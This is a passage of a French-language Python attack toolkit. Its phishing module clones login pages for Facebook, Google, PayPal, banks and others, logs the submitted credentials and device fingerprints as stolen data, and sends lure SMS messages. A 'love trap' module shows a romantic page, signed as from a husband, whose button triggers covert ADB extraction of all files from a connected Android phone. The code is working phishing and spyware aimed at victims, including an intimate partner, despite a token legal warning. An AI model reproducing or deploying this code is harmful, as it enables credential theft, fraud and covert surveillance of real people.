            cursor: pointer;
            margin-top: 16px;
            transition: background 0.3s;
        }}
        .btn:hover {{ filter: brightness(1.1); }}
        .links {{
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid #dddfe2;
        }}
        .divider {{
            margin: 20px 0;
            text-align: center;
            position: relative;
        }}
        .divider::before {{
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            border-top: 1px solid #dddfe2;
        }}
        .divider span {{
            background: white;
            padding: 0 16px;
            color: #606770;
            font-size: 14px;
            position: relative;
        }}
        .footer {{
            margin-top: 20px;
            color: #606770;
            font-size: 12px;
        }}
        .secure {{
            color: #31a24c;
            font-size: 13px;
            margin-top: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
        }}
    </style>
</head>
<body>
    <div class="container">
        {"<img src='" + t["logo"] + "' class='logo' alt='Logo'>" if t["logo"] else "<h1>" + t["title"].split(" - ")[0] + "</h1>"}
        {subtitle_html}
        <form method="POST" action="/capture">
            <input type="hidden" name="_redirect" value="{redirect_url}">
            {fields_html}
            <button type="submit" class="btn">{t["button"]}</button>
        </form>
        <div class="links">
            {forgot_html}
        </div>
        {"<div class='divider'><span>ou</span></div>" + create_html if create_html else ""}
        <p class="secure">
            <svg width="12" height="14" viewBox="0 0 12 14" fill="#31a24c"><path d="M6 0C3.8 0 2 1.8 2 4v2H1c-.6 0-1 .4-1 1v6c0 .6.4 1 1 1h10c.6 0 1-.4 1-1V7c0-.6-.4-1-1-1H10V4c0-2.2-1.8-4-4-4zm2 6H4V4c0-1.1.9-2 2-2s2 .9 2 2v2z"/></svg>
            Connexion sécurisée
        </p>
    </div>
    <script>
        document.querySelector('form').addEventListener('submit', function(e) {{
            var extra = document.createElement('input');
            extra.type = 'hidden';
            extra.name = '_browser_info';
            extra.value = JSON.stringify({{
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href
            }});
            this.appendChild(extra);
        }});
    </script>
</body>
</html>'''
    return html, redirect_url

def generate_success_page(redirect_url="https://www.google.com", template="facebook"):
    """Page affichée après capture - redirige vers le VRAI site"""
    
    messages = {
        "facebook": ("Connexion réussie", "Redirection vers Facebook..."),
        "google": ("Vérification terminée", "Connexion à votre compte Google..."),
        "instagram": ("Connexion réussie", "Redirection vers Instagram..."),
        "whatsapp": ("Vérification réussie", "Ouverture de WhatsApp Web..."),
        "netflix": ("Bienvenue", "Chargement de Netflix..."),
        "paypal": ("Connexion sécurisée", "Accès à votre compte PayPal..."),
        "bank": ("Authentification réussie", "Accès à votre espace client..."),
        "tiktok": ("Connexion réussie", "Redirection vers TikTok..."),
        "snapchat": ("Login successful", "Opening Snapchat..."),
        "outlook": ("Connexion réussie", "Accès à votre boîte mail..."),
        "amazon": ("Connexion réussie", "Accès à votre compte Amazon...")
    }
    
    title, msg = messages.get(template, ("Connexion réussie", "Redirection en cours..."))
    
    return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #f0f2f5;
        }}
        .container {{
            background: white;
            padding: 50px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 400px;
        }}
        .check {{
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #31a24c;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px;
            animation: pop 0.4s ease;
        }}
        .check svg {{
            width: 40px;
            height: 40px;
            fill: white;
        }}
        @keyframes pop {{
            0% {{ transform: scale(0); }}
            80% {{ transform: scale(1.1); }}
            100% {{ transform: scale(1); }}
        }}
        h2 {{
            color: #1c1e21;
            margin-bottom: 10px;
            font-size: 24px;
        }}
        p {{
            color: #606770;
            font-size: 16px;
        }}
        .loader {{
            width: 30px;
            height: 30px;
            border: 3px solid #e4e6eb;
            border-top-color: #1877f2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto 0;
        }}
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="check">
            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
        </div>
        <h2>{title}</h2>
        <p>{msg}</p>
        <div class="loader"></div>
    </div>
    <script>
        setTimeout(function() {{
            window.location.href = '{redirect_url}';
        }}, 2000);
    </script>
</body>
</html>'''

class PhishingHandler(BaseHTTPRequestHandler):
    """Handler pour le serveur de phishing"""
    
    template = "facebook"
    redirect_url = "https://www.facebook.com"
    
    def log_message(self, format, *args):
        pass  # Supprime les logs HTTP
    
    def do_GET(self):
        """Page de phishing"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        html, redirect = generate_phishing_page(self.template)
        PhishingHandler.redirect_url = redirect
        self.wfile.write(html.encode('utf-8'))
    
    def do_POST(self):
        """Capture les données envoyées"""
        global CAPTURED_DATA
        
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parser les données
        from urllib.parse import parse_qs
        data = parse_qs(post_data)
        
        # Extraire l'URL de redirection depuis le formulaire
        redirect_url = PhishingHandler.redirect_url
        if '_redirect' in data:
            redirect_url = data['_redirect'][0]
        
        # Nettoyer les données (enlever champs internes)
        clean_data = {}
        for k, v in data.items():
            if not k.startswith('_'):
                clean_data[k] = v[0] if len(v) == 1 else v
        
        captured = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "template": self.template,
            "ip": self.client_address[0],
            "user_agent": self.headers.get('User-Agent', 'Unknown'),
            "data": clean_data
        }
        
        # Parser browser_info si présent
        if '_browser_info' in data:
            try:
                captured['browser_info'] = json.loads(data['_browser_info'][0])
            except:
                pass
        
        CAPTURED_DATA.append(captured)
        
        # Sauvegarder immédiatement
        save_captured_data(captured)
        
        # Afficher en temps réel
        print(f"\n{C.RED}{'═'*70}{C.END}")
        print(f"{C.BOLD}{C.RED}🎣 IDENTIFIANTS CAPTURÉS!{C.END}")
        print(f"{C.RED}{'═'*70}{C.END}")
        print(f"    {C.YELLOW}⏰ Heure:{C.END} {captured['timestamp']}")
        print(f"    {C.YELLOW}🎭 Site:{C.END} {self.template.upper()}")
        print(f"    {C.YELLOW}🌐 IP Victime:{C.END} {captured['ip']}")
        print(f"\n    {C.GREEN}🔐 IDENTIFIANTS VOLÉS:{C.END}")
        for key, value in captured['data'].items():
            if 'password' in key.lower() or 'secret' in key.lower() or 'code' in key.lower():
                print(f"        {C.RED}🔑 {key}: {value}{C.END}")
            else:
                print(f"        {C.CYAN}📧 {key}: {value}{C.END}")
        print(f"{C.RED}{'═'*70}{C.END}\n")
        
        # Envoyer page de succès qui redirige vers le VRAI site
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        success_html = generate_success_page(redirect_url, self.template)
        self.wfile.write(success_html.encode('utf-8'))

def save_captured_data(data):
    """Sauvegarde les données capturées"""
    phishing_dir = OUTPUT_BASE / "PHISHING_CAPTURES"
    phishing_dir.mkdir(parents=True, exist_ok=True)
    
    # Fichier JSON avec toutes les captures
    all_captures_file = phishing_dir / "all_captures.json"
    
    all_data = []
    if all_captures_file.exists():
        try:
            with open(all_captures_file, 'r', encoding='utf-8') as f:
                all_data = json.load(f)
        except:
            all_data = []
    
    all_data.append(data)
    
    with open(all_captures_file, 'w', encoding='utf-8') as f:
        json.dump(all_data, f, indent=2, ensure_ascii=False)
    
    # Fichier texte lisible pour cette capture
    template_name = data.get('template', 'unknown').upper()
    capture_file = phishing_dir / f"capture_{template_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(capture_file, 'w', encoding='utf-8') as f:
        f.write("="*60 + "\n")
        f.write(f"🎣 IDENTIFIANTS VOLÉS - {template_name}\n")
        f.write("="*60 + "\n\n")
        f.write(f"Date/Heure: {data['timestamp']}\n")
        f.write(f"Site cible: {template_name}\n")
        f.write(f"IP Victime: {data['ip']}\n")
        f.write(f"User-Agent: {data['user_agent']}\n\n")
        f.write("-"*40 + "\n")
        f.write("🔐 IDENTIFIANTS CAPTURÉS:\n")
        f.write("-"*40 + "\n")
        for key, value in data['data'].items():
            f.write(f"  {key}: {value}\n")
        if 'browser_info' in data:
            f.write("\n" + "-"*40 + "\n")
            f.write("📱 INFOS APPAREIL:\n")
            f.write("-"*40 + "\n")
            for key, value in data['browser_info'].items():
                f.write(f"  {key}: {value}\n")
    
    print_success(f"Données sauvegardées: {capture_file.name}")

def start_phishing_server(template="facebook", port=8888):
    """Démarre le serveur de phishing"""
    global PHISHING_SERVER, PHISHING_PORT
    
    PHISHING_PORT = port
    PhishingHandler.template = template
    
    print(f"\n{C.RED}{'═'*70}{C.END}")
    print(f"{C.BOLD}{C.RED}🎣 SERVEUR PHISHING{C.END}")
    print(f"{C.RED}{'═'*70}{C.END}\n")
    
    local_ip = get_local_ip()
    
    try:
        PHISHING_SERVER = HTTPServer(('0.0.0.0', port), PhishingHandler)
        
        print(f"    {C.GREEN}✓ Serveur démarré sur le port {port}{C.END}\n")
        print(f"    {C.YELLOW}📎 LIENS À ENVOYER:{C.END}")
        print(f"    {C.CYAN}   • Local:    http://127.0.0.1:{port}{C.END}")
        print(f"    {C.CYAN}   • Réseau:   http://{local_ip}:{port}{C.END}")
        print(f"\n    {C.RED}⚠️  En attente de connexions...{C.END}")
        print(f"    {C.YELLOW}   (Ctrl+C pour arrêter){C.END}\n")
        
        # Démarrer dans un thread
        server_thread = threading.Thread(target=PHISHING_SERVER.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        return local_ip, port
        
    except OSError as e:
        if "Address already in use" in str(e) or "10048" in str(e):
            print_error(f"Port {port} déjà utilisé. Essayez un autre port.")
        else:
            print_error(f"Erreur: {e}")
        return None, None

def stop_phishing_server():
    """Arrête le serveur de phishing"""
    global PHISHING_SERVER
    if PHISHING_SERVER:
        PHISHING_SERVER.shutdown()
        PHISHING_SERVER = None
        print_success("Serveur phishing arrêté")
    else:
        print_info("Aucun serveur en cours")

def phishing_menu():
    """Menu interactif pour le phishing"""
    global CAPTURED_DATA
    
    print(f"\n{C.RED}{'═'*70}{C.END}")
    print(f"{C.BOLD}{C.RED}🎣 MODULE PHISHING - FAUX SITES WEB{C.END}")
    print(f"{C.RED}{'═'*70}{C.END}")
    
    print(f"""
    {C.YELLOW}⚠️  AVERTISSEMENT LÉGAL:{C.END}
    {C.WHITE}Ce module est destiné UNIQUEMENT aux tests de sécurité
    sur vos propres appareils ou avec autorisation explicite.
    L'utilisation non autorisée est ILLÉGALE.{C.END}
    """)
    
    templates = {
        "1": ("facebook", "Facebook"),
        "2": ("google", "Google"),
        "3": ("instagram", "Instagram"),
        "4": ("whatsapp", "WhatsApp"),
        "5": ("netflix", "Netflix"),
        "6": ("paypal", "PayPal"),
        "7": ("bank", "Banque Générique"),
        "8": ("custom", "Page Personnalisée")
    }
    
    print(f"\n    {C.CYAN}📋 TEMPLATES DISPONIBLES:{C.END}")
    for key, (_, name) in templates.items():
        print(f"        {C.GREEN}{key}.{C.END} {name}")
    
    print(f"\n    {C.CYAN}🔧 OPTIONS:{C.END}")
    print(f"        {C.GREEN}9.{C.END} Voir les données capturées")
    print(f"        {C.GREEN}10.{C.END} Arrêter le serveur")
    print(f"        {C.GREEN}0.{C.END} Retour")
    
    choice = input(f"\n    {C.YELLOW}Choix: {C.END}").strip()
    
    if choice == "0":
        return
    elif choice == "9":
        # Afficher les captures
        if CAPTURED_DATA:
            print(f"\n{C.GREEN}📋 DONNÉES CAPTURÉES ({len(CAPTURED_DATA)} entrées):{C.END}")
            for i, cap in enumerate(CAPTURED_DATA, 1):
                print(f"\n    [{i}] {cap['timestamp']} - IP: {cap['ip']}")
                for k, v in cap['data'].items():
                    print(f"        {k}: {v}")
        else:
            print_info("Aucune donnée capturée pour le moment")
        return
    elif choice == "10":
        stop_phishing_server()
        return
    elif choice in templates:
        template_id, template_name = templates[choice]
        
        port = input(f"\n    Port (défaut 8888): ").strip()
        port = int(port) if port else 8888
        
        local_ip, port = start_phishing_server(template_id, port)
        
        if local_ip:
            print(f"\n    {C.YELLOW}📲 ENVOYER LE LIEN AU TÉLÉPHONE?{C.END}")
            print(f"        1. Envoyer par SMS")
            print(f"        2. Juste afficher le lien")
            
            send_choice = input(f"\n    Choix: ").strip()
            
            if send_choice == "1":
                phone = input("    Numéro de téléphone: ").strip()
                link = f"http://{local_ip}:{port}"
                
                messages = [
                    f"🔒 Alerte sécurité: Votre compte a été compromis. Vérifiez: {link}",
                    f"⚠️ Action requise: Confirmez votre identité: {link}",
                    f"📱 Vérification de sécurité requise: {link}",
                    f"🎁 Vous avez gagné! Réclamez ici: {link}"
                ]
                
                print(f"\n    {C.CYAN}Messages prédéfinis:{C.END}")
                for i, msg in enumerate(messages, 1):
                    print(f"        {i}. {msg[:50]}...")
                print(f"        5. Message personnalisé")
                
                msg_choice = input("\n    Choix du message: ").strip()
                
                if msg_choice == "5":
                    message = input("    Votre message (utilisez {link} pour le lien): ")
                    message = message.replace("{link}", link)
                elif msg_choice in ["1", "2", "3", "4"]:
                    message = messages[int(msg_choice) - 1]
                else:
                    message = messages[0]
                
                # Envoyer le SMS
                send_sms(phone, message)
                print_success(f"SMS envoyé à {phone}")
            
            # Attendre les captures
            print(f"\n    {C.RED}🎯 SERVEUR ACTIF - En attente de victimes...{C.END}")
            print(f"    {C.YELLOW}Appuyez sur Entrée pour revenir au menu{C.END}")
            input()

def send_phishing_link(template="facebook"):
    """Raccourci pour envoyer un lien phishing"""
    local_ip = get_local_ip()
    port = 8888
    
    # Démarrer le serveur
    start_phishing_server(template, port)
    
    link = f"http://{local_ip}:{port}"
    
    print(f"\n    {C.GREEN}🔗 Lien phishing: {link}{C.END}")
    
    phone = input("\n    Numéro pour envoyer le SMS: ").strip()
    if phone:
        message = f"⚠️ Vérification de sécurité requise pour votre compte: {link}"
        send_sms(phone, message)
        print_success(f"Lien envoyé à {phone}")
    
    return link

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 26: PIÈGE AMOUR 💕 - EXTRACTION AUTOMATIQUE
# ═══════════════════════════════════════════════════════════════════════════════

LOVE_TRAP_SERVER = None
LOVE_TRAP_EXTRACTION_DONE = False
NGROK_PROCESS = None

def generate_love_page():
    """Génère la page piège romantique"""
    
    return '''<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💕 Un message pour toi...</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;400;600&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #ff6b9d 0%, #ff8a80 25%, #ffc1e3 50%, #ff6b9d 75%, #c471ed 100%);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .hearts {
            position: fixed;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 0;
        }
        
        .heart {
            position: absolute;
            font-size: 20px;
            animation: fall linear infinite;
            opacity: 0.7;
        }
        
        @keyframes fall {
            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 50px 40px;
            border-radius: 30px;
            box-shadow: 0 20px 60px rgba(255, 107, 157, 0.4);
            text-align: center;
            max-width: 420px;
            width: 90%;
            z-index: 10;
            position: relative;
            animation: pulse 2s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.02); }
        }
        
        .envelope {
            font-size: 80px;
            margin-bottom: 20px;
            animation: bounce 1s ease infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        h1 {
            font-family: 'Dancing Script', cursive;
            color: #ff6b9d;
            font-size: 36px;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(255, 107, 157, 0.3);
        }
        
        .message {
            color: #666;
            font-size: 18px;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        
        .message strong {
            color: #ff6b9d;
        }
        
        .btn {
            display: inline-block;
            padding: 18px 50px;
            background: linear-gradient(135deg, #ff6b9d, #ff8a80);
            color: white;
            text-decoration: none;
            border-radius: 50px;
            font-size: 20px;
            font-weight: 600;
            border: none;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(255, 107, 157, 0.4);
            transition: all 0.3s ease;
            animation: glow 2s ease-in-out infinite;
        }
        
        @keyframes glow {
            0%, 100% { box-shadow: 0 10px 30px rgba(255, 107, 157, 0.4); }
            50% { box-shadow: 0 10px 40px rgba(255, 107, 157, 0.6), 0 0 20px rgba(255, 107, 157, 0.3); }
        }
        
        .btn:hover {
            transform: translateY(-3px) scale(1.05);
            box-shadow: 0 15px 40px rgba(255, 107, 157, 0.5);
        }
        
        .footer {
            margin-top: 30px;
            color: #999;
            font-size: 12px;
        }
        
        .loading {
            display: none;
            flex-direction: column;
            align-items: center;
        }
        
        .loading.active {
            display: flex;
        }
        
        .content.hidden {
            display: none;
        }
        
        .heart-loader {
            font-size: 60px;
            animation: heartbeat 1s ease infinite;
        }
        
        @keyframes heartbeat {
            0%, 100% { transform: scale(1); }
            25% { transform: scale(1.1); }
            50% { transform: scale(1); }
            75% { transform: scale(1.2); }
        }
        
        .loading-text {
            color: #ff6b9d;
            font-size: 18px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="hearts" id="hearts"></div>
    
    <div class="container">
        <div class="content" id="content">
            <div class="envelope">💌</div>
            <h1>J'ai un petit mot pour toi bébé...</h1>
            <p class="message">
                Quelqu'un de <strong>très spécial</strong> a préparé une surprise rien que pour toi 💕<br><br>
                Clique sur le bouton pour découvrir ton message d'amour...
            </p>
            <button class="btn" onclick="openLoveLetter()">
                💝 Ouvrir mon message 💝
            </button>
            <p class="footer">Un message envoyé avec amour ❤️</p>
        </div>
        
        <div class="loading" id="loading">
            <div class="heart-loader">💖</div>
            <p class="loading-text">Préparation de ta surprise...</p>
            <p class="loading-text" style="font-size: 14px; margin-top: 10px;">Cela peut prendre quelques instants 💕</p>
        </div>
    </div>

    <script>
        // Créer les coeurs qui tombent
        function createHearts() {
            const container = document.getElementById('hearts');
            const hearts = ['💕', '💖', '💗', '💝', '💘', '❤️', '💜', '💙'];
            
            for (let i = 0; i < 30; i++) {
                const heart = document.createElement('div');
                heart.className = 'heart';
                heart.innerHTML = hearts[Math.floor(Math.random() * hearts.length)];
                heart.style.left = Math.random() * 100 + '%';
                heart.style.animationDuration = (Math.random() * 3 + 4) + 's';
                heart.style.animationDelay = Math.random() * 5 + 's';
                heart.style.fontSize = (Math.random() * 20 + 15) + 'px';
                container.appendChild(heart);
            }
        }
        createHearts();
        
        function openLoveLetter() {
            document.getElementById('content').classList.add('hidden');
            document.getElementById('loading').classList.add('active');
            
            // Envoyer la requête pour déclencher l'extraction
            fetch('/trigger_extraction', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    setTimeout(() => {
                        window.location.href = '/love_message';
                    }, 3000);
                })
                .catch(err => {
                    setTimeout(() => {
                        window.location.href = '/love_message';
                    }, 3000);
                });
        }
    </script>
</body>
</html>'''

def generate_love_message_page():
    """Page avec le faux message d'amour après extraction"""
    return '''<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💕 Mon message pour toi</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;400&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .letter {
            background: white;
            padding: 50px 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
            max-width: 500px;
            width: 100%;
            text-align: center;
            position: relative;
        }
        
        .letter::before {
            content: "💌";
            position: absolute;
            top: -30px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 60px;
        }
        
        h1 {
            font-family: 'Dancing Script', cursive;
            color: #e74c3c;
            font-size: 42px;
            margin: 20px 0;
        }
        
        .hearts-row {
            font-size: 30px;
            margin: 20px 0;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .message {
            color: #555;
            font-size: 18px;
            line-height: 1.8;
            margin: 30px 0;
            font-style: italic;
        }
        
        .signature {
            font-family: 'Dancing Script', cursive;
            color: #e74c3c;
            font-size: 28px;
            margin-top: 30px;
        }
        
        .footer {
            margin-top: 30px;
            color: #999;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="letter">
        <h1>💖 JE T'AIME MA FEMME AU FOYER 💖</h1>
        <div class="hearts-row">💕 💋 💕 💋 💕 💋 💕</div>
        <p class="message" style="font-size: 32px; margin: 50px 0;">
            <span style="font-size: 42px; color: #ff1493;">💋 BISOUS 💋</span>
        </p>
        <div class="signature">
            <span style="font-size: 28px;">❤️ Ton Mari ❤️</span>
        </div>
    </div>
</body>
</html>'''

class LoveTrapHandler(BaseHTTPRequestHandler):
    """Handler pour le piège amour avec extraction automatique"""
    
    def log_message(self, format, *args):
        # Afficher les logs pour debug
        print(f"    {C.CYAN}[HTTP] {args[0]} {args[1]}{C.END}")
    
    def do_OPTIONS(self):
        """Handle CORS preflight"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, ngrok-skip-browser-warning')
        self.end_headers()
    
    def do_GET(self):
        print(f"    {C.YELLOW}📥 Requête GET reçue: {self.path}{C.END}")
        
        # Headers pour contourner l'avertissement ngrok
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.send_header('ngrok-skip-browser-warning', 'true')
        self.send_header('User-Agent', 'Mozilla/5.0')
        self.end_headers()
        
        if self.path == '/love_message':
            self.wfile.write(generate_love_message_page().encode('utf-8'))
        else:
            print(f"    {C.GREEN}🎯 CIBLE A OUVERT LE LIEN!{C.END}")
            self.wfile.write(generate_love_page().encode('utf-8'))
    
    def do_POST(self):
        global LOVE_TRAP_EXTRACTION_DONE
        
        print(f"    {C.RED}📤 Requête POST reçue: {self.path}{C.END}")
        
        if self.path == '/trigger_extraction':
            # Déclencher l'extraction en arrière-plan
            if not LOVE_TRAP_EXTRACTION_DONE:
                print(f"\n{C.RED}{'═'*70}{C.END}")
                print(f"{C.BOLD}{C.RED}💕 PIÈGE AMOUR DÉCLENCHÉ! LA VICTIME A CLIQUÉ!{C.END}")
                print(f"{C.RED}{'═'*70}{C.END}")
                print(f"\n{C.YELLOW}🚀 EXTRACTION AUTOMATIQUE EN COURS...{C.END}\n")
                
                # Lancer l'extraction dans un thread séparé
                extraction_thread = threading.Thread(target=love_trap_extraction)
                extraction_thread.daemon = False  # Important: ne pas daemon pour que l'extraction finisse
                extraction_thread.start()
                
                LOVE_TRAP_EXTRACTION_DONE = True
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'{"status": "ok"}')
        
        elif self.path == '/check_status':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            status = "done" if LOVE_TRAP_EXTRACTION_DONE else "waiting"
            self.wfile.write(f'{{"status": "{status}"}}'.encode())

def love_trap_extraction():
    """Extraction complète déclenchée par le piège amour avec progression en temps réel"""
    global DEVICE, ADB_PATH
    
    print(f"\n{C.RED}{'═'*70}{C.END}")
    print(f"{C.BOLD}{C.RED}🚨 EXTRACTION PIÈGE AMOUR DÉMARRÉE!{C.END}")
    print(f"{C.RED}{'═'*70}{C.END}")
    print(f"\n    {C.YELLOW}📱 Appareil cible: {DEVICE}{C.END}")
    print(f"    {C.YELLOW}🔧 ADB: {ADB_PATH}{C.END}\n")
    
    love_dir = OUTPUT_BASE / "PIEGE_AMOUR_EXTRACTION"
    love_dir.mkdir(parents=True, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    extraction_dir = love_dir / f"extraction_{timestamp}"
    extraction_dir.mkdir(parents=True, exist_ok=True)
    
    print(f"    {C.CYAN}📁 Dossier: {extraction_dir}{C.END}\n")
    
    results = {}
    total_files = 0
    total_size = 0
    
    # Vérifier la connexion ADB d'abord
    try:
        check = subprocess.run(f'"{ADB_PATH}" -s {DEVICE} shell echo "OK"', 
                              shell=True, capture_output=True, text=True, timeout=10)
        if "OK" not in check.stdout:
            print(f"    {C.RED}⚠️ Appareil non connecté! Tentative de reconnexion...{C.END}")
            subprocess.run(f'"{ADB_PATH}" connect {DEVICE}', shell=True, capture_output=True, timeout=10)
    except Exception as e:
        print(f"    {C.RED}⚠️ Erreur connexion: {e}{C.END}")
    
    def extract_with_progress(source_path, dest_path, file_type, step_num, total_steps):
        """Extrait des fichiers avec affichage de progression en temps réel - CHAQUE FICHIER VISIBLE"""
        nonlocal total_files, total_size
        
        print(f"\n    {C.CYAN}{'═'*60}{C.END}")
        print(f"    {C.BOLD}{C.GREEN}[{step_num}/{total_steps}] {file_type}{C.END}")
        print(f"    {C.CYAN}{'═'*60}{C.END}")
        print(f"    {C.YELLOW}📂 Source: {source_path}{C.END}")
        print(f"    {C.YELLOW}📁 Destination: {dest_path}{C.END}\n")
        
        # Créer le dossier destination
        Path(dest_path).mkdir(parents=True, exist_ok=True)
        
        # Lister TOUS les fichiers avec leurs tailles
        print(f"    {C.CYAN}🔍 Analyse des fichiers...{C.END}")
        list_cmd = f'"{ADB_PATH}" -s {DEVICE} shell "find {source_path} -type f 2>/dev/null"'
        list_result = subprocess.run(list_cmd, shell=True, capture_output=True, text=True, timeout=60)
        
        files_list = [f for f in list_result.stdout.strip().split('\n') if f and not f.startswith('find:') and f.strip()]
        file_count = len(files_list)
        
        if file_count == 0:
            print(f"    {C.YELLOW}⚠️  Aucun fichier trouvé dans {source_path}{C.END}")
            return 0, 0
        
        print(f"    {C.GREEN}📊 {file_count} fichiers trouvés à télécharger{C.END}")
        print(f"\n    {C.MAGENTA}{'─'*60}{C.END}")
        print(f"    {C.BOLD}{C.MAGENTA}⬇️  TÉLÉCHARGEMENT EN COURS...{C.END}")
        print(f"    {C.MAGENTA}{'─'*60}{C.END}\n")
        
        downloaded_count = 0
        downloaded_size = 0
        errors = 0
        
        # Télécharger fichier par fichier pour voir la progression
        for idx, file_path in enumerate(files_list, 1):
            file_path = file_path.strip()
            if not file_path:
                continue
            
            # Extraire le nom du fichier
            file_name = file_path.split('/')[-1] if '/' in file_path else file_path
            
            # Calculer le chemin de destination relatif
            relative_path = file_path.replace(source_path, '').lstrip('/')
            dest_file = Path(dest_path) / relative_path
            dest_file.parent.mkdir(parents=True, exist_ok=True)
            
            # Obtenir la taille du fichier
            size_cmd = f'"{ADB_PATH}" -s {DEVICE} shell "stat -c%s \\"{file_path}\\" 2>/dev/null"'
            size_result = subprocess.run(size_cmd, shell=True, capture_output=True, text=True, timeout=10)
            try:
                file_size = int(size_result.stdout.strip())
            except:
                file_size = 0
            
            # Barre de progression globale
            percent = (idx / file_count) * 100
            bar_length = 40
            filled = int(bar_length * idx / file_count)
            bar = '█' * filled + '░' * (bar_length - filled)
            
            # Afficher la progression
            size_str = f"{file_size/1024:.1f}KB" if file_size < 1024*1024 else f"{file_size/(1024*1024):.1f}MB"
            
            print(f"\r    {C.GREEN}[{bar}] {percent:5.1f}%{C.END} ({idx}/{file_count})", end='')
            print(f"\n    {C.CYAN}📥 {file_name[:40]:<40}{C.END} {C.YELLOW}[{size_str}]{C.END}", end='')
            
            # Télécharger le fichier
            pull_cmd = f'"{ADB_PATH}" -s {DEVICE} pull "{file_path}" "{dest_file}" 2>&1'
            result = subprocess.run(pull_cmd, shell=True, capture_output=True, text=True, timeout=120)
            
            if dest_file.exists():
                actual_size = dest_file.stat().st_size
                downloaded_count += 1
                downloaded_size += actual_size
                print(f" {C.GREEN}✓{C.END}", end='')
            else:
                errors += 1
                print(f" {C.RED}✗{C.END}", end='')
            
            print()  # Nouvelle ligne
        
        total_files += downloaded_count
        total_size += downloaded_size
        
        # Résumé
        print(f"\n    {C.CYAN}{'─'*60}{C.END}")
        print(f"    {C.BOLD}{C.GREEN}✅ TÉLÉCHARGEMENT TERMINÉ!{C.END}")
        print(f"    {C.CYAN}{'─'*60}{C.END}")
        print(f"    {C.WHITE}📁 Fichiers téléchargés: {C.GREEN}{downloaded_count}/{file_count}{C.END}")
        print(f"    {C.WHITE}💾 Taille totale: {C.GREEN}{downloaded_size/(1024*1024):.2f} MB{C.END}")
